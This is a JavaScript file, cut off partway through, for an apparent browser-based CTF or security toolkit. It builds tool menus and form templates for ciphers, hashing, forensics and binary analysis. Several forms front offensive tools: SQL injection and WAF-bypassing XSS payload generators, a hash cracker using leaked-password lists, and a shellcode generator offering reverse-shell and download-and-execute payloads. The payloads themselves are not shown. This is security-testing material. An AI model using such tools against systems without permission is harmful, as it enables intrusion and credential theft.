// Navigation functionality
document.addEventListener('DOMContentLoaded', function() {
    const navLinks = document.querySelectorAll('.nav-link');
    const sections = document.querySelectorAll('.tool-section');

    navLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const targetSection = this.getAttribute('data-section');

            // Remove active class from all nav links and sections
            navLinks.forEach(l => l.classList.remove('active'));
            sections.forEach(s => s.classList.remove('active'));

            // Add active class to clicked nav link and corresponding section
            this.classList.add('active');
            document.getElementById(targetSection).classList.add('active');
        });
    });
});

// Modal functionality
function showTool(toolName) {
    const modal = document.getElementById('toolModal');
    const modalTitle = document.getElementById('modalTitle');
    const modalBody = document.getElementById('modalBody');

    modalTitle.textContent = getToolTitle(toolName);
    modalBody.innerHTML = getToolInterface(toolName);
    modal.style.display = 'block';

    // Initialize tool-specific functionality
    initializeTool(toolName);
}

function closeModal() {
    document.getElementById('toolModal').style.display = 'none';
}

// Close modal when clicking outside
window.onclick = function(event) {
    const modal = document.getElementById('toolModal');
    if (event.target === modal) {
        closeModal();
    }
}

// Tool titles mapping
function getToolTitle(toolName) {
    const titles = {
        'base64': 'Base64 Encoder/Decoder',
        'hash': 'Hash Analyzer',
        'cipher': 'Caesar Cipher',
        'hex': 'Hex Converter',
        'url': 'URL Encoder/Decoder',
        'ascii': 'ASCII Converter',
        'caesar': 'Caesar Cipher',
        'vigenere': 'Vigenère Cipher',
        'atbash': 'Atbash Cipher',
        'rot13': 'ROT13 Cipher',
        'hash-identifier': 'Hash Identifier',
        'md5': 'MD5 Tools',
        'sha': 'SHA Tools',
        'rainbow': 'Rainbow Tables Lookup',
        'sqli-detector': 'SQL Injection Detector',
        'payload-generator': 'Payload Generator',
        'xss-detector': 'XSS Detector',
        'js-beautifier': 'JavaScript Beautifier',
        'request-builder': 'HTTP Request Builder',
        'header-analyzer': 'HTTP Header Analyzer',
        'file-analyzer': 'File Analyzer',
        'metadata-extractor': 'Metadata Extractor',
        'hex-viewer': 'Hex Viewer',
        'stego-detector': 'Steganography Detector',
        'lsb-extractor': 'LSB Steganography Extractor',
        'pcap-analyzer': 'PCAP Analyzer',
        'packet-viewer': 'Network Packet Viewer',
        'disassembler': 'Binary Disassembler',
        'decompiler': 'Code Decompiler',
        'binary-analyzer': 'Binary File Analyzer',
        'string-extractor': 'String Extractor',
        'rop-gadget': 'ROP Gadget Finder',
        'shellcode-generator': 'Shellcode Generator',
        'pattern-generator': 'Pattern Generator',
        'offset-finder': 'Offset Finder',
        'qr-decoder': 'QR Code Decoder',
        'barcode-decoder': 'Barcode Decoder',
        'morse-decoder': 'Morse Code Decoder',
        'brainfuck': 'Brainfuck Interpreter',
        'jwt-decoder': 'JWT Token Decoder',
        'sql-injection': 'SQL Injection Tool',
        'xss-payloads': 'XSS Payload Generator',
        'hash-cracker': 'Hash Cracker',
        'steganography': 'Steganography Analyzer',
        'binary-converter': 'Binary Converter',
        'forensics-analyzer': 'File Forensics Analyzer',
        'password-generator': 'Password Generator'
    };
    return titles[toolName] || 'Unknown Tool';
}

// Tool interfaces
function getToolInterface(toolName) {
    switch(toolName) {
        case 'base64':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input Text:</label>
                        <textarea id="base64Input" rows="4" placeholder="Enter text to encode/decode"></textarea>
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="base64Encode()">Encode</button>
                        <button class="btn" onclick="base64Decode()">Decode</button>
                        <button class="btn" onclick="clearBase64()">Clear</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="base64Output" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'hash':
        case 'hash-identifier':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Hash Input:</label>
                        <input type="text" id="hashInput" placeholder="Enter hash to identify/analyze">
                    </div>
                    <button class="btn" onclick="analyzeHash()">Analyze Hash</button>
                    <div class="input-group">
                        <label>Hash Analysis:</label>
                        <div id="hashOutput" class="output-area"></div>
                    </div>
                    <div class="input-group">
                        <label>Generate Hash:</label>
                        <input type="text" id="textToHash" placeholder="Enter text to hash">
                        <select id="hashType">
                            <option value="md5">MD5</option>
                            <option value="sha1">SHA-1</option>
                            <option value="sha256">SHA-256</option>
                            <option value="sha512">SHA-512</option>
                        </select>
                        <button class="btn" onclick="generateHash()">Generate Hash</button>
                        <div id="generatedHash" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'caesar':
        case 'cipher':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input Text:</label>
                        <textarea id="caesarInput" rows="4" placeholder="Enter text to encrypt/decrypt"></textarea>
                    </div>
                    <div class="input-group">
                        <label>Shift Value (0-25):</label>
                        <input type="number" id="caesarShift" min="0" max="25" value="13">
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="caesarEncrypt()">Encrypt</button>
                        <button class="btn" onclick="caesarDecrypt()">Decrypt</button>
                        <button class="btn" onclick="caesarBruteForce()">Brute Force</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="caesarOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'hex':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input:</label>
                        <textarea id="hexInput" rows="4" placeholder="Enter text or hex to convert"></textarea>
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="textToHex()">Text to Hex</button>
                        <button class="btn" onclick="hexToText()">Hex to Text</button>
                        <button class="btn" onclick="hexToDecimal()">Hex to Decimal</button>
                        <button class="btn" onclick="decimalToHex()">Decimal to Hex</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="hexOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'url':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>URL Input:</label>
                        <textarea id="urlInput" rows="4" placeholder="Enter URL to encode/decode"></textarea>
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="urlEncode()">URL Encode</button>
                        <button class="btn" onclick="urlDecode()">URL Decode</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="urlOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'vigenere':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input Text:</label>
                        <textarea id="vigenereInput" rows="4" placeholder="Enter text to encrypt/decrypt"></textarea>
                    </div>
                    <div class="input-group">
                        <label>Key:</label>
                        <input type="text" id="vigenereKey" placeholder="Enter encryption key">
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="vigenereEncrypt()">Encrypt</button>
                        <button class="btn" onclick="vigenereDecrypt()">Decrypt</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="vigenereOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'morse-decoder':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input:</label>
                        <textarea id="morseInput" rows="4" placeholder="Enter text or morse code"></textarea>
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="textToMorse()">Text to Morse</button>
                        <button class="btn" onclick="morseToText()">Morse to Text</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="morseOutput" class="output-area"></div>
                    </div>
                    <div class="message info">
                        <strong>Morse Code Reference:</strong><br>
                        Use dots (.) and dashes (-) separated by spaces for letters, and spaces between words.
                    </div>
                </div>
            `;

        case 'request-builder':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>HTTP Method:</label>
                        <select id="httpMethod">
                            <option value="GET">GET</option>
                            <option value="POST">POST</option>
                            <option value="PUT">PUT</option>
                            <option value="DELETE">DELETE</option>
                            <option value="HEAD">HEAD</option>
                            <option value="OPTIONS">OPTIONS</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>URL:</label>
                        <input type="text" id="requestUrl" placeholder="https://example.com/api/endpoint">
                    </div>
                    <div class="input-group">
                        <label>Headers (JSON format):</label>
                        <textarea id="requestHeaders" rows="3" placeholder='{"Content-Type": "application/json", "Authorization": "Bearer token"}'></textarea>
                    </div>
                    <div class="input-group">
                        <label>Body (for POST/PUT):</label>
                        <textarea id="requestBody" rows="4" placeholder="Request body content"></textarea>
                    </div>
                    <button class="btn" onclick="buildRequest()">Build Request</button>
                    <div class="input-group">
                        <label>Generated Request:</label>
                        <div id="requestOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'jwt-decoder':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>JWT Token:</label>
                        <textarea id="jwtInput" rows="4" placeholder="Enter JWT token to decode"></textarea>
                    </div>
                    <button class="btn" onclick="decodeJWT()">Decode JWT</button>
                    <div class="input-group">
                        <label>Decoded JWT:</label>
                        <div id="jwtOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'sql-injection':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Target URL:</label>
                        <input type="text" id="sqlUrl" placeholder="http://target.com/page.php?id=1">
                    </div>
                    <div class="input-group">
                        <label>Parameter:</label>
                        <input type="text" id="sqlParam" placeholder="id">
                    </div>
                    <div class="input-group">
                        <label>Payload Type:</label>
                        <select id="sqlPayloadType">
                            <option value="union">UNION Based</option>
                            <option value="boolean">Boolean Based</option>
                            <option value="time">Time Based</option>
                            <option value="error">Error Based</option>
                        </select>
                    </div>
                    <button class="btn" onclick="generateSQLPayloads()">Generate Payloads</button>
                    <div class="input-group">
                        <label>Generated Payloads:</label>
                        <div id="sqlOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'xss-payloads':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Context:</label>
                        <select id="xssContext">
                            <option value="html">HTML Context</option>
                            <option value="attribute">Attribute Context</option>
                            <option value="javascript">JavaScript Context</option>
                            <option value="css">CSS Context</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Bypass Type:</label>
                        <select id="xssBypass">
                            <option value="basic">Basic XSS</option>
                            <option value="filter">Filter Bypass</option>
                            <option value="waf">WAF Bypass</option>
                            <option value="encoded">Encoded Payloads</option>
                        </select>
                    </div>
                    <button class="btn" onclick="generateXSSPayloads()">Generate XSS Payloads</button>
                    <div class="input-group">
                        <label>XSS Payloads:</label>
                        <div id="xssOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'hash-cracker':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Hash to Crack:</label>
                        <input type="text" id="crackHash" placeholder="Enter hash">
                    </div>
                    <div class="input-group">
                        <label>Hash Type:</label>
                        <select id="crackHashType">
                            <option value="md5">MD5</option>
                            <option value="sha1">SHA-1</option>
                            <option value="sha256">SHA-256</option>
                            <option value="sha512">SHA-512</option>
                            <option value="ntlm">NTLM</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Attack Mode:</label>
                        <select id="attackMode">
                            <option value="dictionary">Dictionary Attack</option>
                            <option value="bruteforce">Brute Force</option>
                            <option value="hybrid">Hybrid Attack</option>
                            <option value="mask">Mask Attack</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Wordlist:</label>
                        <select id="wordlist">
                            <option value="common">Common Passwords</option>
                            <option value="rockyou">RockYou Top 10000</option>
                            <option value="leaked">Leaked Passwords</option>
                            <option value="custom">Custom List</option>
                        </select>
                    </div>
                    <div class="input-group" id="customWordlistGroup" style="display: none;">
                        <label>Custom Wordlist (one per line):</label>
                        <textarea id="customWordlist" rows="4" placeholder="password1\npassword2\nadmin\n123456"></textarea>
                    </div>
                    <div class="input-group" id="maskGroup" style="display: none;">
                        <label>Mask Pattern (? = any, ?l = lowercase, ?u = uppercase, ?d = digit, ?s = symbol):</label>
                        <input type="text" id="maskPattern" placeholder="?u?l?l?l?l?d?d?d" value="?u?l?l?l?l?d?d?d">
                    </div>
                    <div class="input-group">
                        <label>Max Length (for brute force):</label>
                        <input type="number" id="maxLength" value="6" min="1" max="8">
                    </div>
                    <button class="btn" onclick="crackHash()">Start Cracking</button>
                    <button class="btn" onclick="stopCracking()" style="background: #e74c3c;">Stop</button>
                    <div class="input-group">
                        <label>Progress:</label>
                        <div class="progress-bar">
                            <div id="crackProgress" class="progress-fill"></div>
                        </div>
                        <div id="crackStatus" style="margin-top: 0.5rem; color: #bbb;"></div>
                    </div>
                    <div class="input-group">
                        <label>Result:</label>
                        <div id="crackOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'steganography':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Upload Image:</label>
                        <input type="file" id="stegoImage" accept="image/*">
                    </div>
                    <div class="input-group">
                        <label>Analysis Type:</label>
                        <select id="stegoType">
                            <option value="lsb">LSB Analysis</option>
                            <option value="metadata">Metadata Extraction</option>
                            <option value="strings">String Extraction</option>
                            <option value="visual">Visual Analysis</option>
                        </select>
                    </div>
                    <button class="btn" onclick="analyzeSteganography()">Analyze Image</button>
                    <div class="input-group">
                        <label>Analysis Results:</label>
                        <div id="stegoOutput" class="output-area"></div>
                    </div>
                    <div id="stegoCanvas" style="margin-top: 1rem;"></div>
                </div>
            `;

        case 'binary-converter':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input:</label>
                        <textarea id="binaryInput" rows="4" placeholder="Enter text, binary, decimal, or hex"></textarea>
                    </div>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem;">
                        <button class="btn" onclick="textToBinary()">Text → Binary</button>
                        <button class="btn" onclick="binaryToText()">Binary → Text</button>
                        <button class="btn" onclick="textToHex()">Text → Hex</button>
                        <button class="btn" onclick="hexToText()">Hex → Text</button>
                        <button class="btn" onclick="textToDecimal()">Text → Decimal</button>
                        <button class="btn" onclick="decimalToText()">Decimal → Text</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="binaryOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'forensics-analyzer':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Upload File:</label>
                        <input type="file" id="forensicsFile">
                    </div>
                    <div class="input-group">
                        <label>Analysis Type:</label>
                        <select id="forensicsType">
                            <option value="header">File Header Analysis</option>
                            <option value="strings">String Extraction</option>
                            <option value="metadata">Metadata Analysis</option>
                            <option value="entropy">Entropy Analysis</option>
                        </select>
                    </div>
                    <button class="btn" onclick="analyzeFile()">Analyze File</button>
                    <div class="input-group">
                        <label>Analysis Results:</label>
                        <div id="forensicsOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'password-generator':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Password Length:</label>
                        <input type="number" id="passLength" value="12" min="4" max="128">
                    </div>
                    <div class="input-group">
                        <label>Character Sets:</label>
                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.5rem;">
                            <label><input type="checkbox" id="includeUpper" checked> Uppercase (A-Z)</label>
                            <label><input type="checkbox" id="includeLower" checked> Lowercase (a-z)</label>
                            <label><input type="checkbox" id="includeNumbers" checked> Numbers (0-9)</label>
                            <label><input type="checkbox" id="includeSymbols"> Symbols (!@#$%)</label>
                        </div>
                    </div>
                    <div class="input-group">
                        <label>Count:</label>
                        <input type="number" id="passCount" value="5" min="1" max="50">
                    </div>
                    <button class="btn" onclick="generatePasswords()">Generate Passwords</button>
                    <div class="input-group">
                        <label>Generated Passwords:</label>
                        <div id="passwordOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'rot13':
        case 'atbash':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input Text:</label>
                        <textarea id="cipherInput" rows="4" placeholder="Enter text to encrypt/decrypt"></textarea>
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="applyCipher('${toolName}')">Apply ${toolName.toUpperCase()}</button>
                        <button class="btn" onclick="clearCipher()">Clear</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="cipherOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'ascii':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input:</label>
                        <textarea id="asciiInput" rows="4" placeholder="Enter text or ASCII codes"></textarea>
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="textToAscii()">Text to ASCII</button>
                        <button class="btn" onclick="asciiToText()">ASCII to Text</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="asciiOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'md5':
        case 'sha':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Input Text:</label>
                        <textarea id="hashTextInput" rows="4" placeholder="Enter text to hash"></textarea>
                    </div>
                    <div class="input-group">
                        <label>Hash Type:</label>
                        <select id="selectedHashType">
                            <option value="md5">MD5</option>
                            <option value="sha1">SHA-1</option>
                            <option value="sha256">SHA-256</option>
                            <option value="sha512">SHA-512</option>
                        </select>
                    </div>
                    <button class="btn" onclick="generateSpecificHash()">Generate Hash</button>
                    <div class="input-group">
                        <label>Generated Hash:</label>
                        <div id="specificHashOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'rainbow':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Hash to Lookup:</label>
                        <input type="text" id="rainbowHash" placeholder="Enter hash for rainbow table lookup">
                    </div>
                    <button class="btn" onclick="rainbowLookup()">Rainbow Table Lookup</button>
                    <div class="input-group">
                        <label>Lookup Result:</label>
                        <div id="rainbowOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'metadata-extractor':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Upload File:</label>
                        <input type="file" id="metadataFile">
                    </div>
                    <button class="btn" onclick="extractMetadata()">Extract Metadata</button>
                    <div class="input-group">
                        <label>Extracted Metadata:</label>
                        <div id="metadataOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'hex-viewer':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Upload File or Enter Hex:</label>
                        <input type="file" id="hexViewerFile">
                        <textarea id="hexViewerInput" rows="4" placeholder="Or paste hex data here"></textarea>
                    </div>
                    <button class="btn" onclick="viewHex()">View Hex</button>
                    <div class="input-group">
                        <label>Hex View:</label>
                        <div id="hexViewerOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'js-beautifier':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>JavaScript Code:</label>
                        <textarea id="jsInput" rows="6" placeholder="Enter minified JavaScript code"></textarea>
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="beautifyJS()">Beautify</button>
                        <button class="btn" onclick="minifyJS()">Minify</button>
                    </div>
                    <div class="input-group">
                        <label>Formatted Code:</label>
                        <div id="jsOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'header-analyzer':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>URL to Analyze:</label>
                        <input type="text" id="headerUrl" placeholder="https://example.com">
                    </div>
                    <button class="btn" onclick="analyzeHeaders()">Analyze Headers</button>
                    <div class="input-group">
                        <label>Security Headers Analysis:</label>
                        <div id="headerOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'qr-decoder':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Upload QR Code Image:</label>
                        <input type="file" id="qrFile" accept="image/*">
                    </div>
                    <div class="input-group">
                        <label>Or Enter QR Data Manually:</label>
                        <textarea id="qrInput" rows="4" placeholder="Enter QR code data to generate"></textarea>
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="decodeQR()">Decode QR</button>
                        <button class="btn" onclick="generateQR()">Generate QR</button>
                    </div>
                    <div class="input-group">
                        <label>Result:</label>
                        <div id="qrOutput" class="output-area"></div>
                    </div>
                    <div id="qrDisplay" style="margin-top: 1rem;"></div>
                </div>
            `;

        case 'brainfuck':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Brainfuck Code:</label>
                        <textarea id="bfCode" rows="6" placeholder="Enter Brainfuck code (e.g., ++++++++++[>+++++++>++++++++++>+++>+<<<<-]>++.>+.+++++++..+++.>++.<<+++++++++++++++.>.+++.------.--------.>+.)"></textarea>
                    </div>
                    <div class="input-group">
                        <label>Input (if needed):</label>
                        <input type="text" id="bfInput" placeholder="Input for the program">
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button class="btn" onclick="executeBrainfuck()">Execute</button>
                        <button class="btn" onclick="loadBFExample()">Load Example</button>
                    </div>
                    <div class="input-group">
                        <label>Output:</label>
                        <div id="bfOutput" class="output-area"></div>
                    </div>
                    <div class="message info">
                        <strong>Brainfuck Commands:</strong><br>
                        > increment pointer | < decrement pointer | + increment value | - decrement value<br>
                        . output character | , input character | [ loop start | ] loop end
                    </div>
                </div>
            `;

        case 'barcode-decoder':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Upload Barcode Image:</label>
                        <input type="file" id="barcodeFile" accept="image/*">
                    </div>
                    <div class="input-group">
                        <label>Barcode Type:</label>
                        <select id="barcodeType">
                            <option value="auto">Auto-detect</option>
                            <option value="code128">Code 128</option>
                            <option value="code39">Code 39</option>
                            <option value="ean13">EAN-13</option>
                            <option value="ean8">EAN-8</option>
                            <option value="upc">UPC</option>
                        </select>
                    </div>
                    <button class="btn" onclick="decodeBarcode()">Decode Barcode</button>
                    <div class="input-group">
                        <label>Decoded Data:</label>
                        <div id="barcodeOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'payload-generator':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Payload Type:</label>
                        <select id="payloadType">
                            <option value="web">Web Application</option>
                            <option value="network">Network</option>
                            <option value="system">System/OS</option>
                            <option value="mobile">Mobile Application</option>
                            <option value="iot">IoT/Embedded</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Target Platform:</label>
                        <select id="targetPlatform">
                            <option value="linux">Linux</option>
                            <option value="windows">Windows</option>
                            <option value="macos">macOS</option>
                            <option value="android">Android</option>
                            <option value="ios">iOS</option>
                            <option value="embedded">Embedded</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Attack Vector:</label>
                        <select id="attackVector">
                            <option value="buffer_overflow">Buffer Overflow</option>
                            <option value="format_string">Format String</option>
                            <option value="return_oriented">Return Oriented Programming</option>
                            <option value="shell_injection">Shell Injection</option>
                            <option value="code_injection">Code Injection</option>
                            <option value="privilege_escalation">Privilege Escalation</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Payload Options:</label>
                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.5rem;">
                            <label><input type="checkbox" id="encodePayload"> Encode Payload</label>
                            <label><input type="checkbox" id="bypassFilter"> Bypass Filters</label>
                            <label><input type="checkbox" id="polymorph"> Polymorphic</label>
                            <label><input type="checkbox" id="multistage"> Multi-stage</label>
                        </div>
                    </div>
                    <button class="btn" onclick="generateAdvancedPayloads()">Generate Payloads</button>
                    <div class="input-group">
                        <label>Generated Payloads:</label>
                        <div id="payloadOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'disassembler':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Upload Binary File:</label>
                        <input type="file" id="binaryFile">
                    </div>
                    <div class="input-group">
                        <label>Architecture:</label>
                        <select id="architecture">
                            <option value="x86">x86 (32-bit)</option>
                            <option value="x64">x64 (64-bit)</option>
                            <option value="arm">ARM</option>
                            <option value="arm64">ARM64</option>
                            <option value="mips">MIPS</option>
                            <option value="riscv">RISC-V</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Analysis Depth:</label>
                        <select id="analysisDepth">
                            <option value="basic">Basic Disassembly</option>
                            <option value="control_flow">Control Flow Analysis</option>
                            <option value="function_detection">Function Detection</option>
                            <option value="symbol_analysis">Symbol Analysis</option>
                            <option value="vulnerability_scan">Vulnerability Scanning</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Hex Input (alternative):</label>
                        <textarea id="hexInput" rows="4" placeholder="Enter hexadecimal bytes (e.g., 48894824488944241048c7c0...)"></textarea>
                    </div>
                    <button class="btn" onclick="disassembleBinary()">Disassemble</button>
                    <div class="input-group">
                        <label>Disassembly Results:</label>
                        <div id="disassemblyOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'string-extractor':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Upload Binary File:</label>
                        <input type="file" id="stringFile">
                    </div>
                    <div class="input-group">
                        <label>String Type:</label>
                        <select id="stringType">
                            <option value="ascii">ASCII Strings</option>
                            <option value="unicode">Unicode Strings</option>
                            <option value="base64">Base64 Encoded</option>
                            <option value="urls">URLs</option>
                            <option value="emails">Email Addresses</option>
                            <option value="ips">IP Addresses</option>
                            <option value="crypto">Cryptographic Keys</option>
                            <option value="all">All Types</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Minimum Length:</label>
                        <input type="number" id="minStringLength" value="4" min="1" max="100">
                    </div>
                    <div class="input-group">
                        <label>Filter Options:</label>
                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.5rem;">
                            <label><input type="checkbox" id="filterCommon" checked> Filter Common Words</label>
                            <label><input type="checkbox" id="deduplicateStrings" checked> Remove Duplicates</label>
                            <label><input type="checkbox" id="sortByLength"> Sort by Length</label>
                            <label><input type="checkbox" id="includeOffset"> Include Offsets</label>
                        </div>
                    </div>
                    <button class="btn" onclick="extractAdvancedStrings()">Extract Strings</button>
                    <div class="input-group">
                        <label>Extracted Strings:</label>
                        <div id="stringExtractorOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'binary-analyzer':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Upload Binary File:</label>
                        <input type="file" id="binaryAnalyzerFile">
                    </div>
                    <div class="input-group">
                        <label>Analysis Type:</label>
                        <select id="binaryAnalysisType">
                            <option value="header">File Header Analysis</option>
                            <option value="sections">Section Analysis</option>
                            <option value="imports">Import Table Analysis</option>
                            <option value="exports">Export Table Analysis</option>
                            <option value="entropy">Entropy Analysis</option>
                            <option value="security">Security Features</option>
                            <option value="packer">Packer Detection</option>
                            <option value="all">Complete Analysis</option>
                        </select>
                    </div>
                    <button class="btn" onclick="analyzeBinaryFile()">Analyze Binary</button>
                    <div class="input-group">
                        <label>Analysis Results:</label>
                        <div id="binaryAnalysisOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'rop-gadget':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Upload Binary File:</label>
                        <input type="file" id="ropFile">
                    </div>
                    <div class="input-group">
                        <label>Architecture:</label>
                        <select id="ropArchitecture">
                            <option value="x86">x86 (32-bit)</option>
                            <option value="x64">x64 (64-bit)</option>
                            <option value="arm">ARM</option>
                            <option value="arm64">ARM64</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Gadget Type:</label>
                        <select id="gadgetType">
                            <option value="all">All Gadgets</option>
                            <option value="pop_ret">POP + RET</option>
                            <option value="mov_ret">MOV + RET</option>
                            <option value="add_ret">ADD + RET</option>
                            <option value="syscall">SYSCALL</option>
                            <option value="jmp_call">JMP/CALL</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Max Instructions:</label>
                        <input type="number" id="maxInstructions" value="5" min="1" max="20">
                    </div>
                    <button class="btn" onclick="findRopGadgets()">Find ROP Gadgets</button>
                    <div class="input-group">
                        <label>ROP Gadgets:</label>
                        <div id="ropOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'shellcode-generator':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Target Architecture:</label>
                        <select id="shellcodeArch">
                            <option value="x86">x86 (32-bit)</option>
                            <option value="x64">x64 (64-bit)</option>
                            <option value="arm">ARM</option>
                            <option value="mips">MIPS</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Payload Type:</label>
                        <select id="shellcodeType">
                            <option value="execve">Execute /bin/sh</option>
                            <option value="bindshell">Bind Shell</option>
                            <option value="reverse">Reverse Shell</option>
                            <option value="download">Download & Execute</option>
                            <option value="read_file">Read File</option>
                            <option value="write_file">Write File</option>
                            <option value="custom">Custom Assembly</option>
                        </select>
                    </div>
                    <div class="input-group" id="customAsmGroup" style="display: none;">
                        <label>Custom Assembly:</label>
                        <textarea id="customAssembly" rows="6" placeholder="Enter assembly code..."></textarea>
                    </div>
                    <div class="input-group">
                        <label>Encoding:</label>
                        <select id="shellcodeEncoding">
                            <option value="none">No Encoding</option>
                            <option value="xor">XOR Encoding</option>
                            <option value="alpha">Alphanumeric</option>
                            <option value="printable">Printable ASCII</option>
                            <option value="unicode">Unicode</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Bad Characters (hex):</label>
                        <input type="text" id="badChars" placeholder="00 0a 0d" value="00 0a 0d">
                    </div>
                    <button class="btn" onclick="generateShellcode()">Generate Shellcode</button>
                    <div class="input-group">
                        <label>Generated Shellcode:</label>
                        <div id="shellcodeOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'pattern-generator':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Pattern Type:</label>
                        <select id="patternType">
                            <option value="cyclic">Cyclic Pattern</option>
                            <option value="alphabet">Alphabet Pattern</option>
                            <option value="numeric">Numeric Pattern</option>
                            <option value="custom">Custom Characters</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Pattern Length:</label>
                        <input type="number" id="patternLength" value="1000" min="1" max="100000">
                    </div>
                    <div class="input-group" id="customCharsGroup" style="display: none;">
                        <label>Custom Characters:</label>
                        <input type="text" id="customChars" placeholder="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789">
                    </div>
